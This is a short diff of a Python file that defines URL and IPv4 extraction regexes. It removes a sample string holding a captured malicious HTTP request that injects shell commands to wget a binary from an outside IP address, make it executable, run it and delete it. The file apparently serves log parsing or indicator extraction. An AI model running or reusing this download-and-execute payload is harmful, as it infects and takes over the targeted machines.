@@ -1,7 +1,5 @@
 import re
 
-myString = "GET /shell?cd /tmp;rm -rf b;wget http:/\\x5C/205.185.115.72/b;wget ftp:/\\x5C/2001:0db8:85a3:0000:0000:8a2e:0370:7334/b;chmod 777 b;sh b;rm -rf b HTTP/1.1"
-
 # Original regex pattern found at: https://gist.github.com/uogbuji/705383
 URL_REGEX = r'\b((?:(ftp|https?):?/?/|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()<>]|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))+(?:\(([^\s()<>]+|(\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:\'\"\\\/.,<>?\xab\xbb\u201c\u201d\u2018\u2019])(?=;))'
 IPv4_REGEX = r'[0-9]+(?:\.[0-9]+){3}'
